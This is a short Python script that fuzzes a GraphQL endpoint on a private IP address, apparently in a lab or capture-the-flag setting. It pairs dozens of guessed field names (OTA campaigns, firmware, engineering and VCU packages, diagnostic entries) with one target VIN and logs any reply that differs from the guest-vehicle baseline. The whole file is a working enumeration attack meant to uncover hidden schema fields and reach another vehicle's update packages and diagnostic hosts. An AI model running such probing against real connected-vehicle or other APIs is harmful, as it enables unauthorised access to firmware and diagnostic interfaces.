import requests, itertools
URL="http://10.225.139.2:8080/graphql"
BASE='{"data":{"vehicles":[{"label":"Guest demo vehicle","vin":"CV6000000DEMO0001"}]}}'
VIN="CV622697F82A936A1"
roots=["vehicle","vehicles","vehicleByVin","vehicleInfo","vehicleDetail","ota","otas","otaCampaign",
"otaCampaigns","campaign","campaigns","campaignByVin","otaPackage","otaPackages","package","packages",
"artifact","artifacts","resource","resources","firmware","firmwares","otaResource","otaResources",
"engineeringPackage","engineering","diagnostic","diagnostics","diagnosticEntry","entry","vcu","vcuPackage"]
sels=["{__typename}","{id}","{vin}","{name}","{id name}","{vin label}","{campaignId}","{packageUrl}",
"{id campaignId packageUrl}","{url}","{host port}","{address}","{vin otaCampaigns{id}}",
"{vin diagnosticEntry{host port}}","{id name packageUrl sha256}","{campaign{id} package{url}}"]
diffs=0; tested=0
for r,s in itertools.product(roots,sels):
    q=f'{{{r}(vin:"{VIN}"){s}}}'
    tested+=1
    try:
        x=requests.post(URL,json={"query":q},timeout=5)
        if x.text.strip()!=BASE:
            print("DIFF",q,x.status_code,x.text[:250],flush=True); diffs+=1
    except Exception: pass
# also without arg
for r,s in itertools.product(roots,sels):
    q=f'{{{r}{s}}}'
    tested+=1
    try:
        x=requests.post(URL,json={"query":q},timeout=5)
        if x.text.strip()!=BASE:
            print("DIFF-noarg",q,x.status_code,x.text[:250],flush=True); diffs+=1
    except Exception: pass
print("tested",tested,"diffs",diffs)
